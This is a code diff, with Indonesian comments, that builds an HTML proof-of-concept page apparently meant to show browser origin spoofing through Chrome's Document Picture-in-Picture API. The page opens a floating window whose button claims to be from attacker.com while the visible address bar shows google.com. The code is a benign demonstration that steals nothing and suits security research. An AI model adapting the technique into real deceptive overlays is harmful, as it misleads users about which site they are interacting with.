@@ -1,29 +1,53 @@
-// Bersihin dulu
-pipWin.document.body.innerHTML = "";
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Attacker - Document PiP Test</title>
+</head>
+<body>
+<h3>Step 1: Click Open PiP</h3>
+<button id="open" style="padding:10px 20px;font-size:16px;">Open PiP</button>
+<br><br>
+<h3>Step 2: After PiP open, go to google.com</h3>
+<a href="https://www.google.com" target="_blank">Open google.com in new tab</a>
 
-// Buat style
-const style = pipWin.document.createElement('style');
-style.textContent = `body{margin:0;font-family:sans-serif} .head{padding:8px;background:#f1f3f4;border-bottom:1px solid #ccc;font-size:12px} .box{padding:15px;text-align:center} button{padding:8px 15px;background:#1a73e8;color:white;border:0;border-radius:4px;cursor:pointer}`;
-pipWin.document.head.appendChild(style);
+<script>
+document.getElementById('open').onclick = async () => {
+  if (!('documentPictureInPicture' in window)) {
+    alert('Need Chrome Desktop 111+');
+    return;
+  }
+  const pipWin = await documentPictureInPicture.requestWindow({
+    width: 350,
+    height: 200
+  });
 
-// Head
-const head = pipWin.document.createElement('div');
-head.className = 'head';
-head.textContent = 'attacker.com PiP - no origin in main UI';
-pipWin.document.body.appendChild(head);
+  // === MULAI CODE PIP YANG BENAR ===
+  pipWin.document.body.innerHTML = "";
+  
+  const style = pipWin.document.createElement('style');
+  style.textContent = `body{margin:0;font-family:sans-serif} .head{padding:8px;background:#f1f3f4;border-bottom:1px solid #ccc;font-size:12px} .box{padding:15px;text-align:center} button{padding:8px 15px;background:#1a73e8;color:white;border:0;border-radius:4px;cursor:pointer}`;
+  pipWin.document.head.appendChild(style);
 
-// Box
-const box = pipWin.document.createElement('div');
-box.className = 'box';
-box.innerHTML = '<b>Clickable test</b><br><br>';
-pipWin.document.body.appendChild(box);
+  const head = pipWin.document.createElement('div');
+  head.className = 'head';
+  head.textContent = 'attacker.com PiP - no origin in main UI';
+  pipWin.document.body.appendChild(head);
 
-// Button yang PASTI bisa diklik
-const btn = pipWin.document.createElement('button');
-btn.textContent = 'Click Me - Test';
-btn.addEventListener('click', () => {
-  // Jangan pakai alert, pakai text ganti biar gak di-block popup
-  btn.textContent = 'Clicked! From attacker.com but bar=google.com';
-  btn.style.background = 'red';
-});
-box.appendChild(btn);
+  const box = pipWin.document.createElement('div');
+  box.className = 'box';
+  box.innerHTML = '<b>Clickable test</b><br><br>';
+  pipWin.document.body.appendChild(box);
+
+  const btn = pipWin.document.createElement('button');
+  btn.textContent = 'Click Me - Test';
+  btn.addEventListener('click', () => {
+    btn.textContent = 'Clicked! From attacker.com but bar=google.com';
+    btn.style.background = 'red';
+  });
+  box.appendChild(btn);
+  // === SELESAI ===
+};
+</script>
+</body>
+</html>
